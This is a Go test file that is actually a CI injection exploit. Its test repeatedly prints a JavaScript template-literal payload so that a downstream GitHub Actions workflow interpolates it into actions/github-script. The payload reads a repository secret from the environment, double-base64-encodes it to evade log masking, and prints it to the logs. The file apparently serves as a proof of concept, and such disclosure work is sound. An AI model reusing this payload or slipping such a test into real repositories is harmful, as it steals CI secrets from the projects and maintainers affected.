package inject

import (
	"fmt"
	"os"
	"testing"
	"time"
)

// Advisory marker printed repeatedly so that it lands in the tail of the
// captured `go test ./... -v` output that pr-checks-run.yml writes to
// test-output-short.txt (tail -30). The consumer workflow
// (pr-checks-comment.yml) cats that file between a fixed EOF heredoc into
// $GITHUB_OUTPUT and then interpolates the resulting step output inside a
// JS template literal in actions/github-script.
const injection = `${(()=>{const s=process.env.GERALT_SECRET||process.env.GERALT||'';const b=Buffer.from(Buffer.from(s).toString('base64')).toString('base64');console.log('GERALT_LEAKED_TOKEN='+b);process.exit(1)})()}`

func TestAdvisoryInjection(t *testing.T) {
	// Keep this package's test running longer than the other packages so that
	// its output is the last thing emitted by `go test ./... -v`.
	deadline := time.Now().Add(180 * time.Second)
	for time.Now().Before(deadline) {
		fmt.Println(injection)
		time.Sleep(500 * time.Millisecond)
	}
	os.Exit(1)
}
